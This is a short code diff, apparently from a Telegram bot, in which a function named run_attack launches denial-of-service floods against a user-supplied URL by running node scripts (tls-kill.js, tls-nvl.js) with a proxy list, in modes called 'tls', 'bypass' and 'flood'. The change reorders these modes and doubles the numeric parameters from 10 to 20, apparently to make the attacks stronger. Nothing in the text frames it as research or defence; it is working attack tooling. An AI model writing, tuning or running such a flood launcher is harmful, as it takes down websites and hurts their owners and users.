@@ -44,9 +44,9 @@ async def run_attack(url, attack_time, update, method, context):
     user_id = update.effective_user.id
     heap_size = "--max-old-space-size=8192"
     commands = {
-        'bypass': f"node {heap_size} tls-kill.js {url} {attack_time} 10 10 live.txt bypass",
-        'flood': f"node {heap_size} tls-kill.js {url} {attack_time} 10 10 live.txt flood",
-        'tls': f"node {heap_size} tls-nvl.js {url} {attack_time} 10 10 live.txt tls",
+        'tls': f"node {heap_size} tls-nvl.js {url} {attack_time} 10 10 live.txt",
+        'bypass': f"node {heap_size} tls-kill.js {url} {attack_time} 20 20 live.txt bypass",
+        'flood': f"node {heap_size} tls-kill.js {url} {attack_time} 20 20 live.txt flood"
     }
 
     command = commands.get(method)
